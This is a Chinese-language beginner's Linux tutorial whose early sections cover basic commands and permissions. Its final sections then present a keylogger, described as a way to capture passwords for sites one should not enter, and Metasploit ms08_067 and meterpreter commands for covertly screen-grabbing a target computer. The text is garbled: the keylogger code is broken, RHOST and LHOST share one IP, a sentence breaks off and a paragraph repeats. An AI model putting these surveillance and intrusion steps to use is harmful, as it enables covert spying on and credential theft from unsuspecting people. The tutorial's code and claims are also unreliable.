# 尝试 Linux 系统

当你习惯了使用 Mac 或 Windows 操作系统时，可能会对如何开始使用 Linux感到有些困惑。这个系统用起来非常简单，但你会发现它的工作方式与其他编程语言略有不同。例如，你会被要求使用命令行提示符来执行你在 Linux 中想要进行的所有操作，而不是点击电脑屏幕上的某个小图标。总的来说，这会让系统上的东西更容易查找，但确实需要一些时间来适应这种工作方式。

熟悉 Linux 编程的一个好方法就是尝试去使用它。本章将花费一些时间学习如何使用 Linux 系统，并教你一些通过命令行提示符可以完成的基础操作，以便你理解并熟悉在 Linux 上需要执行的工作。

## 启动系统

当你刚开始时，你需要启动 Linux 操作系统。你需要以 root 身份登录，这意味着你是管理员，是该系统上的主电脑（超级用户账户）。如果你不是 root 用户，在运行这些命令时将会遇到困难。但由于你很可能是这种形式 Linux 的唯一使用者，所以你应该已经是 root 用户了。Linux 系统启动后，只需在命令行提示符中输入命令 `bt > startx` 即可。

从这里开始，你能够打开用于这种编程语言的终端之一。你需要理解终端的工作原理，因为你会在 Linux 程序中频繁使用它。你可以以许多不同的方式使用它，虽然它与你在 Mac 和 Windows 操作系统上的发现相似，但它有自己独特的部分，这些部分真的能帮助 Linux 成为最好的系统之一。

## 打开你的终端

一旦到达这一步，就是时候打开你将在 Linux 中使用的终端了。你应该通过找到屏幕底部的终端图标来实现。当你看到面前出现一个闪烁的光标时，你就知道已经打开了终端；屏幕上应该还会显示几个选项。如果你用过 Windows 里的命令行提示符，将其进行对比是一个很好的方法。

使用 Linux 时需要记住的一点是它是区分大小写的。这意味着当你编写在该语言中要使用的命令时，需要留意你使用的大写字母和小写字母。如果你不正确使用它们，就会误导程序并导致一些麻烦。请确保正确使用大写和小写字母以获得结果。

## 检查你的目录

一旦终端打开并准备好使用，就可以进行一些探索，并学习更多关于可以使用该系统进行的基础知识了。有时你可能会对这个程序如何工作以及你将如何在 Linux 系统上操作感到有些迷茫，但你很快就能掌握它的。把它想象成其他操作系统中找到的物理驱动器，与其操作像 `c:\` 这样的选项，不如说你将操作 `/`。

正斜杠 `/` 非常重要，因为它代表根目录，它是你所有系统顶层的文件。你所有的目录和文件都会位于之下。这只是一个文件夹，但它将开启你在 Linux 系统内部创建并可能随着时间使用的其他文件夹。如果你不确定它是如何工作的，可以花几分钟创建一些目录，看看它们是如何出现在系统根目录下的。

Linux 系统将以类似于图形化表示的形式设置，基本上像一棵树，根文件位于顶部，然后所有文件、目录等像树枝一样延伸在它下方。在处理这些图形化表示时，你应该理解的内容包括：

- `/bin`: 这是系统存储所有二进制文件的目录。这些程序是 Linux 能够正常运行所必需的。
- `/etc`: 这是放置所有配置文件的目录。当你处于 Linux 程序中时，你会发现大多数文本文件也会通过这些文件进行配置。
- `/dev`: 这是存储设备文件的目录。这类似于在其他操作系统中找到设备驱动程序。
- `/var`: 这是你在 Linux 系统内部找到日志文件以及其他一些选项的目录。

## 学习如何使用 pwd

我们需要花时间的另一个事情是 `pwd`。当你在 Linux 系统上打开终端时，你会发现自己处于默认目录或家目录。你可以在终端打开时通过输入 `bt > pwd` 来确认你所在的目录。在这种情况下，PWD 代表代表“当前工作目录”（present working directory）。

如果你现在正在使用主终端，你应该能得到 `/root` 的返回，因为这是你当时所在的目录。如果你在使用此代码时处于另一个目录，你会得到一个不同的结果来告诉你你是谁。这是跟踪你在 Linux 上位置并确保你处于正确位置的好方法。

## whoami 命令

下一个需要学习的有用命令是 `whoami`。每你想知道是谁登录了系统时，这个命令都很有帮助。如果系统中有两个或多个用户，你还需要检查他们在系统中的身份。如果你是整个系统的管理员，这是一个非常值得学习的命令，因为它让你在想做的事情上拥有很大的自由。

为了简单起见，我们将确定我们是以哪个用户身份登录的。代码只需要你输入 `bt > whoami`。代码将弹出你登录的用户名，如果你是网络上的唯一用户，你应该只会看到 root，这是系统对你电脑的定义。如果你发现名称与 root（你的主电脑）不同，那么你就知道其他人正在使用系统，你应该检查他们是否有权限留在那里。

如你所见，这些只是你可以在 Linux 系统上学习使用的不同命令中的几个。它们可能不是最强大的，无法在系统中做很多事情，但它们非常适合你去尝试并熟悉终端的工作原理，以及编写一些代码的感觉。

## Linux 基础命令

在我们深入探讨 Linux 在系统上可以执行的一些高级功能之前，让我们先花些时间了解 Linux 自带的一些基础知识，以便你至少能够开始学习这个系统的基础操作。

对于我们在这里讨论的命令，我们将使用 Ubuntu 版本的 Linux。如上所述，在选择你想要使用的 Linux 系统时，有几个不同的选项供选择，但由于它是初学者最常用的 Linux 版本（因为它非常容易上手），因此我们将使用它来演示命令。许多其他 Linux 版本也相似，因此更改命令以适应你的版本应该非常简单。

你对 Linux 需要理解的首要要点之一是：你无法通过点击图标来运行程序。相反，你需要调出命令提示符并输入你想使用的内容。记住，Linux 系统是由程序员设计的，因此你使用 Linux 时的界面将类似于编写代码。虽然这与直接点击你想要的图形相比可能显得有些乏味，但它对于你学习如何对 Linux 进行一些严肃的管理工作将非常有帮助。

你使用哪个版本的 Linux 系统并不重要。服务器版本还是桌面版本，都需要你使用命令行或终端（terminal）来完成许多任务。在桌面版本中，你只需要打开终端屏幕，然后输入你想让系统使用的命令即可。如果你通常使用 Windows 或 Mac 作为操作系统，可能需要一点时间来适应，总体来说，你会发现它让你对整个系统拥有更多的权力和控制力。

### Sudo

现在是时候学习一些我们在 Linux 中需要的命令了。第一个要学习的命令是 `sudo`。它基本上代表“super user do”（超级用户执行），首先让我们来看看这背后是如何产生的背景知识。

在 Linux 创建时，负责它的程序员们担心安全问题。在所有的 Linux 计算机内部，有一个用户被称为 Root。这是计算机的最高级别，类似于你在 Windows 计算机上找到的管理员。就像那些程序一样，如果有人在 Linux 上以 root 身份登录，他们可以在计算机上做他们想做的任何事情。有时这是好事，但世界上有这么多黑客，这也意味着间谍软件、病毒和恶意软件可能被下载到另一台计算机上。



为了避免黑客获取不属于他们的计算机 Root 权限而导致某些问题，Linux 的创建者决定没有人能够以 Root 身份登录，即使是他们自己的系统。但这确实产生了一个小问题：如果你无法以 root 身份登录，你如何作为管理员工作呢？

这就是 `sudo` 命令发挥作用的地方。它告诉操作系统你正试图以超级用户或 root 的身份运行命令或进程。这赋予了你一些管理员权限，以便你在 Linux 中执行你想运行的命令。这基本上就是“以管理员身份运行”选项，让你能够运行你想要的程序。

## Man Pages（手册页）

在 Linux 中，学习如何使用 `sudo` 命令很重要，但我们还需要讨论一些你应该知道的其他选项。Man pages（或 manual pages）是你可以在 Linux 内部学习使用的另一个重要工具。这就像是 Linux 系统的字典，如果你不知道想使用哪一个命令，或者想学习某个特定命令是如何工作的，你可以使用 man pages 来了解所有这些。

例如，如果你对查找“ping”命令的信息感兴趣，你可以在 man pages 下查找你想要的内容。使用 man pages 查找所需信息的基本语法包括：

`$ man ping`

这个命令将帮助你获取关于“ping”命令的所需信息，以便你能够学习如何使用它。如果你是 Linux 的初新手，且不确定命令在程序内部将如何工作，或者在某些点应该做什么，那么这个命令就特别有用。

在大多数情况下，如果你可以访问互联网，可以通过简单的 Google 搜索完成同样的事情。但如果网络断了或你不想翻遍所有的在线页面，这可以是一个很好用的的命令。

当你从 man pages 中获取完所需信息后，你需要执行特定操作才能退出。使用退格键（Backspace）或回车键（Enter）无法得到想要的结果。相反，你需要输入字母“Q”，告诉计算机你想退出程序。你将回到系统主界面，并输入你想使用的另一个命令。

## Tasksel

列表中的下一个是讨论 `tasksel` 命令。这基本上是“task select”（任务选择）的命令。当你想要下载一个可能包含几个不同部分的程序时，这个命令将非常有帮助。假设你想在系统上下载一个新的电子邮件服务器；你你会发现你需要下载几个不同的部分以确保它的正常工作。

为了让操作更简单，Linux 的创建者设计了许多供选择的安装包。当你选择其中一个包时，你将运行 `tasksel` 命令，你会被带到一个列出所有这些包的屏幕。例如，如果你想让你正在使用的服务器变成电子邮件服务器，你只需要选择“Email Server”按钮，然后它就会安装你想要软件的所有部分。这将使安装你想要的程序变得容易得多。它是用户友好的、简单的且功能强大的。如果你想下载 Apache Web 服务器，这个 tasksel 选项将在 30 分钟内为你完成一切。需要记住点是，你需要在它前面加上 `sudo` 命令来满足你的需求。调出 tasksel 命令的常用语法包括：

`$ sudo tasksel`

然后你只需按回，系统就会带你进入列表，你可以从中挑选想要下载的内容。只需选择你想要的，点击，然后继续将其放置到你的服务器上。

## Apt-get

我们上面执行的命令是一次性下载很多程序。这些程序都是相互关联的，但它们体积很大，你需要一起下载它们以确保程序能以你想要的方式运行。但当你只想在系统中下载单个程序时，你该怎么办呢？你将使用 `apt-get` 命令来完成。

使用 Linux 的一个好处处是，你想要添加到服务器的大多数软件都是免费的。为了完成这项工作，你可能需要签署一些服务协议等，但它不需要其他操作系统那样的激活程序。相反，Linux 不进行这些激活，而是将其存放在仓库（repositories）中。这些基本上是存放所有可用 Linux 程序的地方。你只需要联网并下载所有你想要使用的 Linux 程序。

在你的计算机中，有一个配置文件会告诉计算机这些存储库的位置。然后你就可以使用 `apt-get` 命令去查找该存储库并获取你想要的程序。你用来发送指令让计算机去寻找你想使用的程序时，可以使用的语法包括：

```
$ sudo apt-get install <name of program>
```

只需按下回车键，计算机就会去寻找你当前正在查看的任何程序。然后计算机就可以为你下载该程序，你可以根据自己的意愿重复此步骤，直到将所需的程序都下载到计算机上。

现在，你已经使用该程序了一段时间，并决定不再使用它了。也许该程序的运行方式不符合你的预期，或者你已经用完了它，不想让它在计算机上占用太多空间。这时，你就可以使用简单的语法将程序从计算机移除：

```
$ sudo apt-get remove <name of program>
```

当你在程序中输入这些内容时，你会发现任何你想丢弃的东西都将被卸载。你需要给它一些时间来从计算机中删除，但这个简单的命令会告诉计算机你想删除那个特定的应用程序，它将开始缓慢为你将其移除。

在大多数情况下，这适用于你想要添加到系统中的大多数程序。这可以让你轻松地获取系统中的所需内容，并确保你不需要为你想要的任何一个程序支付费用。你可能想查看存储库，看看里面有多少个程序；那里有成千上万个程序，随着开发的不断进行，它们也会被放回那里。

学习如何使用本章中的某些命令将使处理 Linux 比以前变得简单一些。你将发现成为程序内的管理员是多么简单，而且你能够随时随心所欲地安装和卸载操作系统中的所有程序，并且其中大多数程序都是免费使用的。这些是你为了让 Linux 操作系统以你喜欢的方式运行而需要尝试的一些基础命令。

## 在 Linux 中导航

现在你已经学会了我们在上一章中学习过的一些基础命令，现在是时候学习如何在 Linux 内部的文件夹之间进行导航了。这与你习惯的某些操作系统可能有些不同。记住，我们之前提到过，在 Mac 和 Windows 等操作系统中，你可以直接点击想要使用的图标，而在 Linux 中，你需要调出命令提示符并输入你想执行的命令。

这与你操作 Linux 系统时发生的情况类似。它看起来和你在 Windows 中看到的内容有点像，但有些差异在起初看起来会令人困惑，实际上这些差异有助于事情变得更容易整合，并保持更好的整洁性。

当你查看 Linux 系统时，你会发现一切都是从根目录（root）函数开始的。记住，这基本上就是你程序中的管理员，你根据你存储东西的地方，在这里可以找到所有树形结构的起点。从这里，你可以将文档、文件等保存到计算机中，树结构就会开始形成。

让我们这样来看：你进入根目录，然后查看那里的起始。你可以拥有“文档”（Documents）、“图片”（Pictures）、“视频”（Videos）之类的选项（你可以根据制作的内容对它们重命名，但我们现在这样做使用它们）。在“文档”内部，你可能还有需要的其他文件，以及进一步分支的文件夹等。在某些其他操作系统中，这一切可能看起来都有些复杂，但当你回到 Linux 的根目录时，你就能看到所有的分支通向何处。

这是存储想要使用的文件的更好方法，并确保你能找到所有东西的位置。虽然它看起来和你在 Windows 计算机上找到的东西有点，但它们的工作方式不同，Linux 系统操作起来更容易，而且存储数据时效率更高。

## 使用 Vim 编辑 Linux 文件

现在你已经理解了在 Linux 中导航将用文件的一些基础知识，是时候对文件内部进行一些编辑了。在 Linux 系统上，你需要处理配置文件。如果你希望你的软件以特定方式运行（例如进行自定义），你就需要打开一个文件并对其进行实际编辑。无论你是在处理 `.php` 还是 `.ini` 文件都是如此。几乎所有的内置配置都以简单文本文件的形式存储，你可以通过编辑它来达到你想要的效果。

现在，你可以选择几个与配置文件配合良好的不同编辑器。对于这一个，我们将讨论 Vim 程序，它通常被认为是 Linux 下你可以使用的最强大的编辑器之一。

当你从 Windows 系统切换到 Linux 时，应该记住的一点是，你将找不到文件关联。在 Windows 系统内部，你会注意到文件后面有一些扩展名。例如，Word 会根据你正在使用的版本将文件保存为 `.doc` 或 `.docx`，图片可以是 `.jpeg` 等。这些文件扩展名将帮助程序判断应该如何打开该文件。但当你操作 Linux 系统时，你找不到这些文件关联，因为系统期望你了解文件内部的内容。

### 启动 Vim

我们将使用 Vim 程序开始处理文件，以完成你想做的编辑。这对你来说很容易上手，但我们首先需要准备好正确的命令以便你打开程序。如果你已经在计算机上安装了该程序，只需从 `sudo` 命令开始，后面跟着一个空格和单词 `vim` 即可。需要的语法包括：

```
sudo vim <filename>
```

记住，在语法中你需要保持 `vim` 单词全小写。这很重要，因为 Linux 系统会区分大写和小写字母的区别，所以你需要使用小写以确保系统知道你正在操作什么。在输入想要编辑的文件名时，也要注意大小写；你必须写得完全一致，否则系统将找不到它。



这就是为了用 `Vim` 程序打开想要编辑的文件而需要执行的所有操作。但你也可以使用这种语法来完成其他事情。当你使用上述完全相同的语法时，你可以创建一些新文件。要查看它是如何运作的，你需要打开命令提示符，然后将上面的命令放在里面。你可以为你想要创建的文件命名，然后它就会打开供你使用。如果你对打开一个新文件供你尝试进行一些新更改感到困惑，请记住这一点。


在 Linux 上工作时，使用 `-iname` 函数真的非常重要。在大多数情况下，Linux 系统对你使用的大小写非常敏感。你必须区分你使用的大写字母和小写字母。但当你使用 `-iname` 函数时，你使用的大小写就没了。

这可以帮助你遍历所有可用目录，无论它们内部使用的是大写还是小写字母。如果你不确定要搜索的文件名称，这将为你节省大量的时间和麻烦。

### 设置密码

当你创建一个新账户时，需要注意创建一个良好且更难破解的密码。密码设置得越复杂，别人进入系统就越困难。如果你将成为几位使用网络的人员员，这一点尤为重要，你应该解释强密码的重要性，并说明不要与他人共享这些信息，以防止以后出现问题。

作为管理员，在设置密码时应该记住的一点是，密码绝不能利用个人信息（如姓名和地址）来组成。你还应该避免字典中常见的单词。在设计密码时，在字母和数字之间来回切换甚至在大小写字母之间切换，都会产生巨大的差异。

作为管理员，偶尔要求用户更改密码（例如每年一次）也是一个好主意，这样别人获取信息的就更加困难。如果用户在尝试多次后未能获得正确的密码和用户名，你甚至可以锁定账户，防止有人使用暴力破解方法进入账户。

### 保护你的文件

有时，你想保护某些文件免受未经授权的访问。这意味着你不希望有人在你不知情的情况下进入系统查看并更改文件。为了解决这个问题，你需要花时间重新查看文件权限设置。

你可以选择系统中的哪些人员可以使用并读取这些文件。你可以选择让他们读取文件内容、写入文件或执行文件，或者让他们这三者兼具。对于你的个人电脑和在上面的信息，你只会将这些权限赋予自己。但如果你在网络环境中工作，你可能想要更改设置，使得在某些情况下只有管理员可以执行所有三个操作，而其他人只能读取那里的文件。

以下是你在 Linux 中使用的一些符号，用于编写系统内每个文件所需的权限：

- `R`: 当此符号出现时，意味着允许用户读取文件内容。
- `W`: 当此符号出现时，意味着允许用户写入文件。
- `X`: 当此符号出现时，只要文件是 bash 脚本，用户就可以执行该文件。

如果这三个符号出现在用户名之前，意味着他们能够完成手头的所有三项任务。在大多数情况下，这将由系统管理员来处理，但可能某些时候其他人也可以查看并进行这些更改。

你可以根据每个文件的内容来决定谁可以对什么文件进行操作。如果是一个每个人都可以共同工作的文档，你可能希望让网络上的所有人都能读取和写入。如果只是几个人正在工作，你可以将操作权限交给这些人，而其他人可能只能读取而不能其他。你可以决定这在你的小组中如何运作。

黑客行为基本上是进入系统以暴露该系统中的某些漏洞。这可以通过许多方式实现，但黑客通常能够在对方不知情的情况下进入电脑。他们可以发送带有有害链接的电子邮件，跟踪对方用于获取信息的屏幕截图和击键记录等等等。无论你是在个人电脑上工作，还是在一个负责保护他人信息的大网络上工作，保持信息安全都是重要的。

需要注意的是，虽然我们在指南中讨论黑客行为，但黑帽黑客被认为是非法的，并可能让你陷入很多麻烦。你试图获取个人的且你不被允许拥有的信息，这种行为的惩罚可能是相当的。

另一方面，还有白帽黑客。这些黑客通常会使用许多你在黑帽客身上发现的技巧。这些人是热爱与计算机工作的人，并将此作为工作的一部分来帮助公司并保护个人信息。你可能会在许多企业、学校、医院等地方发现他们正试图保护所有的个人信息

此外，你可能想要成为一名白帽黑客，以保护你个人电脑上的信息。黑客总是试图寻找系统中的漏洞，而作为白帽黑客，你的工作将是寻找这些漏洞，并在另一个恶意黑客进入你的系统之前将它们修复。这需要一些计划以及在此过程中进行一些学习，但这是确保你的电脑在未来很长一段时间保持安全和强大的最佳方法之一。

### 创建你自己的键盘记录器

我们将查看的第一是如何创建你自己的键盘记录器（keylogger）。在 Linux 编码语言中学习键盘记录器是一项非常有用的技能，它可以跟踪用户一整天进行的所有按键操作。这是获取用户在白天输入的密码和用户名的有效方法，这样你可以进入某些你不该进入的网站。

不过，为了让它运行得最佳，你还需要跟踪几点。首先，当你开始使用键盘记录器时，你会希望它打印的是文本行，而不是仅仅将每个符号放在不同的行上。最基本的键盘记录器公式会将输入的每个字符打印在不同的行上，但这将占用大量的硬盘空间，特别是如果你在每个部分都打印一个日期戳的话。此外，将每个字母放在不同的行上又有什么用呢，因为你将无法阅读它。

所以，我们要对这段代码做的第一件事是确保它是以单词和行的形式写入的。很好的方法是设置系统，使其在行内写入字符，直到出现某种暂停。大多数情况下，你会将其设置为用户向电脑输入时开始新行，然后在输入停止二到三秒时开始新行或停顿。这样你就能看到获取的信息是以句子和段落的形式输入的，而不是随机的字符。



你可能还想在代码中添加一个日期时间戳。这很有用，因为它允许让你看到信息是什么时候输入电脑的。如果你发现用户在每天同一时间输入相同的单词和短语，可能需要查看这些是否是你进入某些网站所需的密码。

当所有这些内容都整合到 Linux 代码中时，你将得到如下内容：

```python
import pyhook

#将此更改为日志文件的路径
log_file = '/home/aman/Desktop/file.log'
```

```python
## 每当按下按键时都会调用此函数
def OnKeyPress(event):
    fob = open(log_file, 'a')
    fob.write(event,'\n')
    fob.writer('\n')
```

```python
if event.ASCII==96: #96 是反引号（grave key）的 ascii 值
    fob.close()
    new_hook.cancel()

### 实例化 HookManager 类
new_hook=pyhook.HookManager()
### 监听所有按键
new_hook.KeyDown=OnKeyPress
### 钩住键盘
new_hook.HookKeyboard()
### 开始话
new_hook.Loop()
```

这需要一些计划以及在此过程中进行一些学习，但这是确保你的电脑在未来很长一段时间保持安全和强大的最佳方法之一。

## 获取截图

现在截图在你工作时可能是一个强大的工具，但你能够

就像设置你需要的攻击。

```
msf> (ms08_067_netapi) set RHOST 192.168.1.108
msf> (ms08_067_netapi) set LHOST 192.168.1.108
```

如果你正确执行了这些操作，你应该已经开始获取你正在寻找的目标计算机的截图了。你将获得在目标计算机上所需的控制权，并且获取此部分所需的所有截图将变得更容易。

在接下来的步骤，我们将学习如何获取对目标计算机的控制权并获取你需要的截图。在此之前，我们需要确定你想要使用的 PID。要获取 PID 代码，你只需要输入语法：

```
meterpreter > getpid
```

你现在应该会弹出一个屏幕，显示目标计算机上的 PID。对于这这个特定的一个，我们将 PID 设置为 932，但它会根据你的目标计算机给出的反馈而改变。现在你已经拥有了这个数字，可以使用以下代码检查它是哪一个进程：

```
meterpreter > ps
```

当你使用此代码来查找与你的目标计算机对应的 PID 时，你应该能注意到它对应于 `schhost.exe` 进程。由于你应该将其用作活动桌面权限进程，因此你已经准备就绪了。如果你还没有该进程的权限，你可能需要多做一些工作，但这应该能让你获得所需的权限。现在你应该通过输入以下语法来激活 Meterpreter 内部的脚本：

```
meterpreter > use espia
```

通过运行此脚本，你将把 `espia.app` 安装到目标计算机上。这应该让调出你正在寻找的截图变得更容易。

要获取目标计算机的一张截图，你只需要输入这段特定的代码：

```
meterpreter > screengrab
```

当这段代码执行完成后，你已经安装的 `espia` 脚本将对目标计算机当前显示的屏幕进行拍摄，然后将其保存到你的根目录中。你可以随时随地查看，并看到另一台计算机正在发生什么。当你从另一台计算机获取所需的所有信息时，那台计算机完全不知道你那里，甚至不知道你正在获取信息。

现在，你可以根据需要多次使用此命令，执行的次数越多，就越容易全面了解目标计算机正在运行什么，以及你可以从那台计算机获取什么信息。刚开始可能觉得工作量很大，但你会喜欢获取所需截图是如此简单的。

当你将这些部分内容与你在上一节中做的键盘记录器结合时，你将能够获得大量信息来帮助黑入另一台计算机。如果你开始注意到某个公共用户名和密码，可以查看其日期时间戳，然后找到与之对应的屏幕。这些截图将向你展示相关内容。
